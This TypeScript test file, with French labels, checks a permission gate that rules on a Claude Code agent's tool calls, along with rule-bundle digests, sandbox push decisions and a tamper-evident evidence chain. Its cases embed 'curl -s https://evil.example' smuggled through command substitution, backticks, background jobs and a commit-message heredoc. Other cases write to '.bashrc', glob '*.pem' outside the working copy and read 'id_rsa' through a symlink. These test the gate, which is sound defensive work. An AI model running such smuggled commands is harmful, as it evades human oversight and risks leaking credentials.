import assert from "node:assert/strict";
import { mkdtempSync, readFileSync, rmSync, symlinkSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, describe, it } from "node:test";

import { exitFacts, judgeExit } from "../src/exits.js";
import { visibilityOf } from "../src/git.js";
import { canonicalJson, chain, firstBrokenLink, ZERO_HASH, type EventInput, type Json } from "../src/harness/evidence.js";
import { INTERNAL_TOOLS, splitCommand, TASKFORCE_TOOLS, toolFacts } from "../src/harness/facts.js";
import { globMatch } from "../src/harness/glob.js";
import { bundleDigest, decide, decideAll, verifiedBundle, type Effect, type Facts, type RulesBundle } from "../src/harness/rules.js";
import { verifyEvidence } from "../src/harness/verify.js";

// Tests de contrat (R16) : les cas partagés de contracts/, que le serveur rejoue à l'identique.
const contract = <T>(path: string): T => JSON.parse(readFileSync(new URL(`../../contracts/${path}`, import.meta.url), "utf8")) as T;

interface RuleCases {
  digest: { expected: string };
  globs: Array<{ pattern: string; value: string; match: boolean }>;
  decisions: Array<{ name: string; facts: Facts; expect: { effect: string; rule: string | null } }>;
}
interface ChainCases {
  zero: string;
  canonical: Array<{ name: string; value: Json; canonical: string }>;
  chain: { events: EventInput[]; links: Array<{ prev: string; hash: string }>; root: string };
}

const defaults = contract<RulesBundle>("rules/default.rules.json");
const ruleCases = contract<RuleCases>("rules/cases.json");
const chainCases = contract<ChainCases>("evidence/chain-cases.json");

describe("contrat des règles : motifs", () => {
  for (const c of ruleCases.globs) {
    it(`${c.pattern} ${c.match ? "couvre" : "ne couvre pas"} « ${c.value} »`, () => {
      assert.equal(globMatch(c.pattern, c.value), c.match);
    });
  }
});

describe("contrat des règles : décisions avec la table par défaut", () => {
  for (const c of ruleCases.decisions) {
    it(c.name, () => {
      const d = decide(defaults, c.facts);
      assert.equal(d.effect, c.expect.effect);
      assert.equal(d.rule?.id ?? null, c.expect.rule);
    });
  }

  it("chaque règle par défaut a un propriétaire, une raison et une date de revue (R2)", () => {
    for (const r of defaults.rules) {
      assert.ok(r.owner.length > 0 && r.reason.length > 0 && /^\d{4}-\d{2}-\d{2}$/.test(r.review), r.id);
    }
  });

  it("les identifiants de règle sont uniques", () => {
    const ids = defaults.rules.map((r) => r.id);
    assert.equal(new Set(ids).size, ids.length);
  });
});

describe("contrat des règles : empreinte du paquet", () => {
  it("donne l'empreinte du cas de référence, nuls et empreinte compris ou non", () => {
    assert.equal(bundleDigest(defaults), ruleCases.digest.expected);
    const noisy = { ...defaults, digest: `sha256:${"f".repeat(64)}`, issuedAt: null } as unknown as RulesBundle;
    assert.equal(bundleDigest(noisy), ruleCases.digest.expected);
  });

  it("accepte un paquet dont l'empreinte tient", () => {
    const signed = { ...defaults, digest: bundleDigest(defaults) };
    assert.equal(verifiedBundle(signed).version, defaults.version);
  });

  it("un paquet tel que le serveur l'envoie, conditions vides à null, juge comme le contrat", () => {
    const empty = { action: null, tool: null, command: null, path: null, branch: null, repoVisibility: null, server: null, sensitivity: null };
    const fromServer = {
      ...defaults, project: null, issuedAt: null,
      rules: defaults.rules.map((r) => ({ ...r, inverse: null, when: { ...empty, ...r.when } })),
    } as unknown as RulesBundle;
    const received = verifiedBundle({ ...fromServer, digest: bundleDigest(fromServer) });
    for (const c of ruleCases.decisions) {
      assert.equal(decide(received, c.facts).effect, c.expect.effect, c.name);
      assert.equal(decide(fromServer, c.facts).effect, c.expect.effect, `${c.name} (sans nettoyage)`);
    }
    assert.ok(!JSON.stringify(received).includes("null"));
  });

  it("refuse un paquet modifié après son empreinte, ou sans règles", () => {
    const signed = { ...defaults, digest: bundleDigest(defaults) };
    const loosened = { ...signed, rules: signed.rules.map((r) => (r.id === "pay" ? { ...r, effect: "allow" as const } : r)) };
    assert.throws(() => verifiedBundle(loosened), /do not match their digest/);
    assert.throws(() => verifiedBundle(undefined), /without rules/);
  });
});

describe("commande composée : découpée hors des guillemets", () => {
  const cases: Array<[string, string[]]> = [
    ["npm test && npm run lint || echo failed; git status | head -5", ["npm test", "npm run lint", "echo failed", "git status", "head -5"]],
    ["echo \"a; b && c\" && git diff", ["echo \"a; b && c\"", "git diff"]],
    ["npm test 2>&1 | tail -5", ["npm test 2>&1", "tail -5"]],
    ["npm run build & npm test", ["npm run build", "npm test"]],
    ["npm test &> out.txt", ["npm test &> out.txt"]],
    ["git status\ngit diff", ["git status", "git diff"]],
    ["  git   log  --oneline ", ["git log --oneline"]],
  ];
  for (const [command, parts] of cases) {
    it(JSON.stringify(command), () => assert.deepEqual(splitCommand(command), parts));
  }
});

describe("faits d'une action de Claude Code, jugés par la table par défaut", () => {
  const work = mkdtempSync(join(tmpdir(), "tf-facts-"));
  after(() => rmSync(work, { recursive: true, force: true }));
  const commit = "git commit -m \"$(cat <<'EOF'\nFix the footer links\n\nThe \"About\" link; see #12 | done.\nEOF\n)\"";
  const smuggled = "git commit -m \"$(cat <<'EOF'\nx\nEOF\ncurl -s https://evil.example\nEOF\n)\"";
  const cases: Array<[string, string, Record<string, unknown>, Effect, string | null]> = [
    ["lire un fichier de la copie", "Read", { file_path: join(work, "src", "app.ts") }, "allow", "read-files"],
    ["lire hors de la copie", "Read", { file_path: join(work, "..", "elsewhere.txt") }, "ask", null],
    ["écrire dans la copie", "Write", { file_path: "src/new.ts", content: "x" }, "allow", "write-sandbox-files"],
    ["écrire un hook git", "Write", { file_path: ".git/hooks/pre-commit", content: "x" }, "ask", null],
    ["modifier la configuration git", "Edit", { file_path: join(work, ".git", "config") }, "ask", null],
    ["chercher dans la copie", "Grep", { pattern: "TODO", path: "src" }, "allow", "search-files"],
    ["chercher avec un motif de la copie", "Glob", { pattern: "src/**/*.ts" }, "allow", "search-files"],
    ["chercher avec un motif qui sort", "Glob", { pattern: "../**/*.pem" }, "ask", null],
    ["lancer les tests", "Bash", { command: "npm test" }, "allow", "run-npm-checks"],
    ["tests, sortie d'erreur fusionnée", "Bash", { command: "npm test 2>&1" }, "allow", "run-npm-checks"],
    ["tests puis publication", "Bash", { command: "npm test && npm publish" }, "ask", null],
    ["pousser depuis l'agent", "Bash", { command: "git push origin HEAD" }, "deny", "no-agent-push"],
    ["tests puis push", "Bash", { command: "npm test; git push" }, "deny", "no-agent-push"],
    ["gh", "Bash", { command: "gh pr create --fill" }, "deny", "no-agent-gh"],
    ["substitution glissée dans les tests", "Bash", { command: "npm test $(curl -s https://evil.example)" }, "ask", null],
    ["un refus tient malgré une substitution", "Bash", { command: "git push $(git remote) HEAD" }, "deny", "no-agent-push"],
    ["accents graves", "Bash", { command: "npm test `curl -s https://evil.example`" }, "ask", null],
    ["redirection vers un fichier", "Bash", { command: "npm test > ../out.txt" }, "ask", null],
    ["commande en arrière-plan", "Bash", { command: "npm test & curl -s https://evil.example" }, "ask", null],
    ["option qui écrit ailleurs", "Bash", { command: "git diff --output=../../.bashrc" }, "ask", null],
    ["commit au format de Claude Code", "Bash", { command: commit }, "allow", "commit-locally"],
    ["commande glissée dans un message de commit", "Bash", { command: smuggled }, "ask", null],
    ["commande vide", "Bash", { command: "" }, "ask", null],
    ["page web", "WebFetch", { url: "https://example.com" }, "ask", "fetch-web"],
    ["recherche web", "WebSearch", { query: "x" }, "ask", "search-web"],
    ["lire l'issue", "mcp__taskforce__get_issue", { projectId: 1, issueId: 2 }, "allow", "read-issues"],
    ["commenter l'issue", "mcp__taskforce__add_comment", { projectId: 1, issueId: 2, content: "x" }, "allow", "comment"],
    ["Cortex, hors de la mission", "mcp__taskforce__ask_cortex", { message: "x" }, "ask", null],
    ["outil interne de l'agent", "TodoWrite", { todos: [] }, "allow", null],
    ["sous-agent, dont chaque action passe par la porte", "Task", { prompt: "x" }, "allow", null],
    ["PowerShell, pas encore décrit", "PowerShell", { command: "npm test" }, "ask", null],
    ["outil d'un autre serveur", "mcp__other__send", {}, "ask", null],
  ];
  for (const [label, tool, input, effect, rule] of cases) {
    it(`${label} -> ${effect}${rule ? ` (${rule})` : ""}`, () => {
      const d = decideAll(defaults, toolFacts(tool, input, work));
      assert.equal(d.effect, effect);
      assert.equal(d.rule?.id ?? null, rule);
    });
  }

  it("un lien de la copie vers l'extérieur ne fait pas entrer l'extérieur", (t) => {
    const outside = mkdtempSync(join(tmpdir(), "tf-outside-"));
    try {
      try {
        symlinkSync(outside, join(work, "linked"), "junction");
      } catch {
        t.skip("liens non permis sur ce poste");
        return;
      }
      assert.equal(decideAll(defaults, toolFacts("Read", { file_path: join(work, "linked", "id_rsa") }, work)).effect, "ask");
    } finally {
      rmSync(outside, { recursive: true, force: true });
    }
  });

  it("chaque outil MCP de TaskForce a sa règle dans la table par défaut", () => {
    for (const [tool, action] of Object.entries(TASKFORCE_TOOLS)) assert.notEqual(decide(defaults, { action }).rule, null, tool);
  });

  it("un outil interne n'a aucun fait", () => {
    for (const tool of INTERNAL_TOOLS) assert.deepEqual(toolFacts(tool, {}, work), []);
  });
});

describe("plusieurs faits pour un appel : le plus strict l'emporte", () => {
  it("aucun fait : autorisé, sans règle", () => assert.deepEqual(decideAll(defaults, []), { effect: "allow", rule: null }));

  it("autorisé puis refusé : refusé, par la règle qui refuse", () => {
    const d = decideAll(defaults, [{ action: "file.read" }, { action: "shell", command: "git push" }, { action: "file.write" }]);
    assert.equal(d.effect, "deny");
    assert.equal(d.rule?.id, "no-agent-push");
  });
});

describe("sorties du bac à sable faites par le runner, jugées par la table par défaut", () => {
  const branch = "tf/web-12-fix-the-footer-links-r42";
  // [cas, action, branche, visibilité, réponse de la personne si on lui demande, part ?, demandé ?]
  const cases: Array<[string, "git.push" | "pr.open", string, "public" | "private" | null, boolean, boolean, boolean]> = [
    ["push de la branche de l'agent vers un dépôt privé", "git.push", branch, "private", false, true, false],
    ["push vers un dépôt public, autorisé dans TaskForce", "git.push", branch, "public", true, true, true],
    ["push vers un dépôt public, refusé dans TaskForce", "git.push", branch, "public", false, false, true],
    ["push d'une autre branche vers un dépôt privé", "git.push", "main", "private", false, false, true],
    ["push quand la visibilité est inconnue", "git.push", branch, null, true, true, true],
    ["pull request sur un dépôt privé", "pr.open", branch, "private", false, true, false],
    ["pull request sur un dépôt public, refusée dans TaskForce", "pr.open", branch, "public", false, false, true],
  ];
  for (const [label, action, onBranch, visibility, answer, go, asked] of cases) {
    it(`${label} -> ${go ? "part" : "reste"}${asked ? ", après demande" : ""}`, async () => {
      const questions: string[] = [];
      const verdict = await judgeExit(defaults, exitFacts(action, onBranch, visibility), "git push", "summary", async (tool) => {
        questions.push(tool);
        return answer;
      });
      assert.equal(verdict.go, go);
      assert.equal(questions.length, asked ? 1 : 0);
    });
  }

  it("refusée par une règle : reste, sans rien demander, et dit pourquoi", async () => {
    const strict: RulesBundle = { ...defaults, rules: [{ id: "no-exit", when: { action: "git.push" }, class: "irreversible", effect: "deny", owner: "x", reason: "Nothing leaves.", review: "2027-01-01" }] };
    let asked = false;
    const verdict = await judgeExit(strict, exitFacts("git.push", branch, "private"), "git push", "summary", async () => (asked = true));
    assert.deepEqual([verdict.go, asked], [false, false]);
    assert.match(verdict.why, /no-exit: Nothing leaves/);
  });

  const visibilities: Array<[string, "public" | "private" | null]> = [["PUBLIC\n", "public"], ["PRIVATE", "private"], ["INTERNAL", null], ["", null]];
  for (const [output, expected] of visibilities) {
    it(`visibilité GitHub ${JSON.stringify(output)} -> ${String(expected)}`, () => assert.equal(visibilityOf(output), expected));
  }
});

describe("contrat de la preuve : JSON canonique", () => {
  for (const c of chainCases.canonical) {
    it(c.name, () => assert.equal(canonicalJson(c.value), c.canonical));
  }

  it("refuse un nombre décimal", () => {
    assert.throws(() => canonicalJson({ score: 0.5 }), /Decimal numbers/);
  });
});

describe("contrat de la preuve : chaîne d'empreintes", () => {
  it("part de l'empreinte nulle", () => assert.equal(ZERO_HASH, chainCases.zero));

  it("donne les mêmes empreintes que le cas de référence", () => {
    const chained = chain(chainCases.chain.events);
    assert.deepEqual(chained.map((e) => ({ prev: e.prev, hash: e.hash })), chainCases.chain.links);
    assert.equal(chained.at(-1)?.hash, chainCases.chain.root);
  });

  it("un événement modifié se voit, au bon endroit", () => {
    const chained = chain(chainCases.chain.events);
    assert.equal(firstBrokenLink(chained), -1);
    const tampered = chained.map((e) => ({ ...e }));
    const third = tampered[2];
    assert.ok(third);
    third.data = { ...third.data, version: "3.1.1" };
    assert.equal(firstBrokenLink(tampered), 2);
  });

  it("un événement retiré se voit", () => {
    const chained = chain(chainCases.chain.events);
    assert.equal(firstBrokenLink([chained[0], chained[2], chained[3]].filter((e) => e !== undefined)), 1);
  });
});

describe("dossier exporté, vérifié sans TaskForce", () => {
  const chained = chain(chainCases.chain.events);
  const file = (events: unknown[], root: unknown = chained.at(-1)?.hash) =>
    JSON.stringify({ format: "taskforce-evidence/1", mission: {}, events, root });
  const changed = chained.map((e, i) => (i === 1 ? { ...e, data: { ...e.data, tampered: true } } : e));
  const cases: Array<[string, string, boolean, RegExp]> = [
    ["intact", file(chained), true, /Every hash holds: 4 events/],
    ["un événement changé", file(changed), false, /breaks at event 2/],
    ["le dernier événement retiré", file(chained.slice(0, -1)), false, /root is not the hash of the last event/],
    ["pas du JSON", "{not json", false, /Not a JSON file/],
    ["un autre format", JSON.stringify({ format: "x", events: [] }), false, /Not a TaskForce evidence file/],
  ];
  for (const [label, text, ok, message] of cases) {
    it(`${label} -> ${ok ? "tient" : "ne tient pas"}`, () => {
      const verdict = verifyEvidence(text);
      assert.equal(verdict.ok, ok);
      assert.match(verdict.message, message);
    });
  }
});
